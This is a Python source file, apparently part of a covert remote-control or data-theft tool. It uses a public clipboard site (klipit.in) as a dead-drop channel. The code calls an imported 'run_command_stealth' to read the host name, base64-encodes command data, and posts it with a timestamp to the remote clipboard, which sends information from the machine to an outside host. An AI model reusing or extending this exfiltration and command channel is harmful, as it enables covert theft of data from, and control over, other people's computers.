import requests
import re
import base64
from executor import run_command_stealth
from bs4 import BeautifulSoup
import datetime


PRIVATEBIN_URL = "https://klipit.in/ipb83086"


def fetch_clipboard_data(url=PRIVATEBIN_URL):
    # Send GET request to fetch the HTML page
    response = requests.get(url)
    
    if response.status_code == 200:
        # Parse HTML content using BeautifulSoup
        soup = BeautifulSoup(response.text, "html.parser")
        
        # Find the text inside the <textarea> tag where the clipboard data is stored
        data = soup.find("textarea", {"id": "data"}).text
        print("Data Fetched")
        return data
    else:
        pass


def push_to_klipit(cmd_data: str):

    session = requests.Session()
    url = PRIVATEBIN_URL

    clipboard = fetch_clipboard_data() or ""
    hostname = run_command_stealth("hostname").strip()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    encoded = base64.b64encode(cmd_data.encode()).decode().strip()

    data = f"{clipboard.strip()}\n[{timestamp}] {hostname}:{encoded}"
    
    # Step 1: Access the clipboard page to retrieve parameters
    response = session.get(url)
    if response.status_code != 200:
        return

    # Extract 'cid' and 'key' from the page content
    cid_match = re.search(r'cid\s*[:=]\s*["\'](\d+)["\']', response.text)
    key_match = re.search(r'key\s*[:=]\s*["\']([a-f0-9]+)["\']', response.text)

    if not cid_match or not key_match:
        with open("debug_clipboard_page.html", "w", encoding="utf-8") as f:
            f.write(response.text)
        return
    


    cid = cid_match.group(1)
    key = key_match.group(1)

    # Step 2: Send POST request to update clipboard content
    post_url = 'https://klipit.in/ajax_save_data.php'
    payload = {
        'i': cid,
        'k': key,
        'd': data
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': url
    }
    post_response = session.post(post_url, data=payload, headers=headers)
    print("Success")

